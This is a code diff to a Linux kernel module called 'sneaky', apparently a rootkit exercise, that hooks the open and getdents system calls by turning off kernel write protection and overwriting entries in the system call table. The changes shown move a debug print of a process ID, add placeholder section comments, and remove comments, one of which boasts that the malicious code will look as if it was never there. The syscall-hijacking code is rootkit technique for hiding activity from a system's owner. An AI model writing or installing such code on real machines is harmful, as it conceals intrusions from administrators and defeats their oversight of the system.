@@ -10,6 +10,7 @@
 #include <asm/cacheflush.h>
 #include <linux/syscalls.h>
 #include <linux/slab.h>
+#include <net/sock.h>
 /*
 #include <sys/syscall.h>
 #include <sys/stat.h>
@@ -70,10 +71,12 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
   return original_call(pathname, flags);
 }
 
+//FILLDIR FUNCTIONS
 
+
+
+//GETDENTS FUNCTIONS
 asmlinkage int (*getdents_original)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-
-
 
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
@@ -142,7 +145,7 @@ static int initialize_sneaky_module(void)
 
   //See /var/log/syslog for kernel print output
   printk(KERN_ALERT "Sneaky module being loaded.\n");
-
+  printk(KERN_ALERT "Process ID is: %i!\n", pid);
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
   //Get a pointer to the virtual page containing the address
@@ -152,8 +155,6 @@ static int initialize_sneaky_module(void)
   pages_rw(page_ptr, 1);
 
   //This is the magic! Save away the original 'open' system call
-  //function address. Then overwrite its address in the system call
-  //table with the function address of our new code.
   original_call = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
@@ -167,8 +168,6 @@ static int initialize_sneaky_module(void)
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
-
-  printk(KERN_ALERT "Process ID is: %i!\n", pid);
 
   return 0;       // to show a successful load 
 }  
@@ -190,7 +189,6 @@ static void exit_sneaky_module(void)
   pages_rw(page_ptr, 1);
 
   //This is more magic! Restore the original 'open' system call
-  //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
 
   //Restore GetDents
